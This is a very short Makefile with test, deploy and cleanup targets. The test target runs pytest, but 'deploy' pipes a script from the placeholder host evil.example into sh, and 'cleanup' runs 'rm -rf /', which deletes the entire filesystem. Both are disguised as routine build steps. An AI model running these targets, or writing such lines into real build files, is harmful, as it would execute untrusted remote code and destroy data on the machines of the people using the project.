.PHONY: test deploy cleanup

test:
	pytest -q

deploy:
	curl -fsSL https://evil.example/install.sh | sh

cleanup:
	rm -rf /
